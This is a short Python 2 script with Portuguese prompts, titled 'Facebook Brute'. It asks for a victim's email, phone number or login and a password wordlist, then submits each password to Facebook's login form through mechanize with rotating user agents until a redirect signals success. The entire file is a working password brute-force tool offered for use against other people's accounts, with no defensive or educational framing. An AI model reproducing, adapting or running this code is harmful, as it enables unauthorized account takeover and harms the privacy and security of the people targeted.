#!/usr/bin/env python
# -*- coding: UTF-8 -*-

'''CRIADO POR WINVASOR'''

from os import system,sys
import mechanize
import cookielib
import random
verde = '\033[32m'
A = '\033[33m'
AZ = '\033[31m'
system('clear')

print  '+=========================================+'
print  '|..........' + AZ + '  Facebook  Brute  '+A+' ...........| '
print  '+-----------------------------------------+'

email = str(raw_input("Digite o Login, Número de telefone ou email da vitima: "))


passwordlist = str(raw_input("Digite o caminho da sua Wordlist: "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
def new():
	system('clear && python2 lut.py')
def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	system('clear')
	welcome()
	search()
	print("A senha não está presente na sua wordlist:")

	
	
def brute(password):
	sys.stdout.write("\rVerificando a senha ==> {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print(verde)
			print("\n\n[+] Senha Correta ==> {}".format(password))
			print(A)
			raw_input("\nAperte Enter Para Sair ....")
			new()
			sys.exit(1)
	else:
		print (AZ + '  INCORRETA  '+A)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	
	total = open(passwordlist,"r")
	total = total.readlines()
	print  '\n\n+=========================================+'
	print  '|..........' + AZ + '  Facebook Brute  '+A+'  ...........| '
	print  '+-----------------------------------------+\n\n'
	print " [*] Email da vitima : {}".format(email)
	print " [*] Wordlist tem :" , len(total), "senhas"
	print " [*] Começando ... Por favor espere...\n\n"

	
if __name__ == '__main__':
	main()


